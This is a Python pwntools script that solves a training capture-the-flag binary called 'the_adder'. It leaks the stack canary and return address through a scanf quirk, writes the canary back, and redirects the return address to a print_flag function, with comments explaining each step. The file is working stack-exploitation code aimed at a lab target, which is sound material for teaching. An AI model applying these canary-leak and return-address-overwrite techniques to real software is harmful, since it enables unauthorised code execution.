from pwn import *

# keeps on summing the inserted value to the previous result (buffer position below current one), without limit
# issue: inserting a value overwrites the buffer current location

PROG = "./the_adder"
COMMANDS = """
b adder
b add_value
c
"""
context.arch = "amd64"

START = 0x13F0 + 39     # virtual return address from adder to the main
DESTINATION = 0x1309    # virtual address of function print_flag

if args.GDB :
    c = gdb.debug(PROG, gdbscript = COMMANDS)
elif args.REMOTE:
    c = remote("the-adder.training.offensivedefensive.it", 8080, ssl=True)
else:
    c = process(PROG)

for i in range(15) :
    c.recvuntil(b"> ", timeout = 1)
    c.sendline(b'1')    # making the program sum another value
    c.recvuntil(b"Number: ")

    if i == 9 :
        # one long word before the canary we put the sum to zero by subtracting the last result of the sum
        c.sendline(bytes(str(-i), "utf-8"))
    elif i == 10 or i == 13 :
        # by sending this, the program leaks the content of the pointed long word (in our case the canary and then the return address) and does not increment i
        # apparenly, the scanf does not write anything, so it does not overwrite the canary and neither does it flush the input buffer, so the next scanf (which asks for y/n to make the sum) takes 0x00, which is clearly not 'y' and therefore the function returns 0 and the counter i is not incremented
        c.sendline(p64(0x00))   # Also, the scanf fails if you do provide an invalid input (e.g. "hello")
    elif i == 11 :
        # once we leaked the canary, we insert it in the same position
        c.sendline(bytes(str(lword), "utf-8"))
    elif i == 12 :
        # instead of the sRBP we make the sum go to 0 like we did before the canary
        c.sendline(bytes(str(-1*lword), "utf-8"))
    elif i == 14 :
        # with the leaked ret address we can decrement it by the virtual ret address (virtual address of main + 39) and add to it the virtual address of the fumction print_flag
        c.sendline(bytes(str(lword - START + DESTINATION), "utf-8"))
    else :
        # apart from the special cases above, we always send 1 as the value to sum
        # this is to make it easier to compute the negative value to set the current sum value to 0 
        c.sendline(b'1')

    # if i is 10 or 13, we have to leak the canary or the ret address, respectively
    if i == 10 or i == 13 :
        c.recvuntil(b"add ")
        leak = c.recvuntil(b'?')    # get all chars after "add " to '?' (leaked canary/ret addr)
        j = 0
        lword = 0

        # here we convert the leaked byte array to the corresponding int value
        while chr(leak[j]) != '?' :
            lword *= 10
            lword += int(chr(leak[j]))
            j += 1

        if i == 10 :
            print(f"Canary:\t\t", hex(lword))
        else :
            print(f"Ret addr.:\t", hex(lword))
    else :
        c.recvline()
        c.sendline(b'y')

c.recvuntil(b"> ", timeout = 1)
c.sendline(b'3')        # making the program return form main

c.recvline()
print(c.recvline())
